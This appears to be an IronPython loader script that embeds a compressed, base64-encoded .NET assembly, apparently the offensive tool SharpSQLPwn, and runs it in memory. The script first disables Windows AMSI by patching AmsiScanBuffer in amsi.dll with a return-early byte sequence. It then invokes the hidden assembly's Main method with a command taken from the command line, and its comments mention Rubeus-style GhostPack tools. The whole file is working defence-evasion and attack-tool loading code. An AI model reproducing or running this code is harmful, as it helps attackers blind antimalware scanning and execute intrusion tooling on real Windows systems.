HXH2S0MYudEfXiW1CgLf5uIuYPsNKecZSJMdhzSp35nR9pLj4ViBg9i0+HvEGjuzPYhvCivDfoX98z5UGm1/ecZbyHtnQHRY6fspDnLd5gxLOle4s3xDTZC5jCc6/hCxo9mzDL0wuIvxfzQn/w0LkzmxPffIsn0O0JhDwBD1PfFsYqqjoEPq7wAHjYTRv4RQOEwIuSZrs9QfDQDeqXq74ni8CschC8eAmxSgav1QGG4HQLu+/ZJFIhA0JkEbcaYMCkZ8M9Zq56vFLOXs0XqvVipTw5a1au1AyE8xDcWgM6JmZzZnXi1NGTV8qAFFh2F+IpFR7ILTxYWADYaEBPplJdMIszs/XIlz4WicQGYjGA3Qbcnk8kYoXcYG5/KpeL7k9Mp/L7U/nU9P6h5OBALh4bGhhO5QHaDfBH+2P9UYBxA27qP56dHDNzc4UrFfPivjMFs4as3Xk50T+ETHevs4pGi7VqKbdwHJM9rE7EKokgLAkAZ3/zXd9mVybPOP5mX8DfF0D7W6sn4fTE6MRnb/95/Ju3/snhX/vOv396evNoO5N79OC53Lnoudo5m0rOVS48eO50oVTI1Qr2/P7q9AX4+gsK6UvsPvJ/27t23iaCIDwkFoKISIgKUa1W0CD5EePCCnaciBDJUqKkCG6j5W7tnLK3d+zeWXHHT6DgT9DRI0TDD6CgokJCNDT5B8Ds3tOxjYxEg2As3Xkf883s3Gpnbh86mEtfP5VTJ48C9ficHzBPgq+dQHFec4XIin/cA7I9H+efohX73AjA89t4P8L7dLnp4gDtOfmGLmXm9U8X1H+PY9uLzwCt1aKktdrC6wBH5hO8mt1+xYGBvt1vfGjrva1cfDc4KxaruPdSnEoupaBdmzewPmwPR3sTQ/ftrpvAlt+1XMfWu5jdQaIU/yb0uvJyxWCY3f0qjdxnkUJbpzgK0cJIo4H5d6w9sigimz1JqAnX87IQkt02WYRpaGaJGmkbbiBPJn/XeqviM+2F3gsWzfEd42qJf3rx3JBZOm8mS+co6ybWLfxvMidaaPjrWSXAOOAW8u/j/5HlNC0NsR0qjUIirDObR+BVGvUlB6IB7lsbFjjJ03JtPGfkn+UWNTKNzocpnpfqnLVXLq1729o5OcVh3r1M5FF+Novs27D2nea7bOWyjdvoSa7M+bD2Yp6a7VcfvwB8K3X2izfvOr1zX5BxOszTjVqDEi6dwPXkqEufHO9V25ToiEmXiUDyLp1wTXtb62vrax2mNfefiglBCKm7NFZyUzun3Ge66nuOCnQwjKpO4G8y7dfGG5T4THpDrqNBWR6CEZKD9V0uIy+aTOlkfpRIdDBdejDZCUPhOcz4zBoLQ1pPECIV66gvh8GS+jQTycipuRMrlJmmMUfxZzHqyd0j5Y09wUdcL4n6gOYoZRz0KU5sNN7nYy6IMNcuZbovx8EZV5TE3o7jcI0ChkxonjbKgtTnaJOpXp/SvVPPjYDpTj0z6tbMgPv79AGwdwNce/gHsP7TX0c/AUufNGA="


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSQLPwn.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()